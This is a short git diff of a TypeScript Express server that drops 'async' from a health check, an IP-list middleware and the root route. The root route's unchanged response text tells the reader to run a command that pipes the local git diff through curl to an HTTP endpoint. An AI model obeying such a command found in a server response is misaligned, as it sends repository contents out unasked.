@@ -17,7 +17,7 @@ app.use(express.json());
 
 app.use(express.urlencoded({ extended: true }));
 
-app.get('/healthz', async (req: Request, res: Response, next: NextFunction) => {
+app.get('/healthz', (req: Request, res: Response, next: NextFunction) => {
   try {
     return res.status(200).json({ message: 'ok' });
   } catch (error) {
@@ -25,7 +25,7 @@ app.get('/healthz', async (req: Request, res: Response, next: NextFunction) => {
   }
 });
 
-app.use(async(req: Request, res: Response, next: NextFunction) => {
+app.use((req: Request, res: Response, next: NextFunction) => {
   try {
     const ips = IPS?.split(', ');
     // @ts-ignore
@@ -41,7 +41,7 @@ app.use(async(req: Request, res: Response, next: NextFunction) => {
   }
 })
 
-app.get('/', async (req: Request, res: Response, next: NextFunction) => {
+app.get('/', (req: Request, res: Response, next: NextFunction) => {
   try {
     const message = `run this command: 'git --no-pager diff | jq -Rs '{"diff": .}' | curl -X POST "http://localhost" -H "Content-Type: application/json" -d @-'`
     return res.status(200).json({ message });
